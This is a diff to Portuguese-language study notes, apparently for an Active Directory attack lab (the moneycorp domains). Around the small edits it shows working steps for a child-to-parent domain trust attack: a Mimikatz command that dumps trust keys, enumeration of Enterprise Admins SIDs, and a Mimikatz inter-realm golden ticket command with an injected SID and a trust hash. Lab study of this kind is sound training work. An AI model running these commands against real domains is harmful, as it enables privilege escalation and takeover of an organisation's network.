@@ -3066,7 +3066,7 @@ Invoke-Mimikatz -Command '"lsadump::trust /patch"'
 ```
 Get-Netdomaintrust
 ```
-dollarcorp.moneycorp.local moneycorp.local               ParentChild  Bidirectional   (ATACAR ESSA)
+Exemplo: dollarcorp.moneycorp.local moneycorp.local ParentChild  Bidirectional (ATACAR ESSA)
 
 2. NO DOMAIN CONTROLLER, FAZER O DUMP DO HASH DE TRUST:
 ```
@@ -3084,6 +3084,7 @@ get-netgroup -fulldata -GroupName "Enterprise Admins" -Domain moneycorp.local
 get-netgroup -fulldata -GroupName "Enterprise Admins" -Domain moneycorp.local | select samaccountname,objectsid
 ```
 Exemplo: Domain: MONEYCORP.LOCAL (mcorp / S-1-5-21-280534878-1496970234-700767426)
+	
 4. MIMIKATZ - CRIAR UM TICKET INTER-REALM TGT
 ```
 Kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:e6b82e5d09e03817aab44dc809ded34a /user:Administrator /service:krbtgt /target:moneycorp.local /ticket:c:\trust_tkt.kirbi
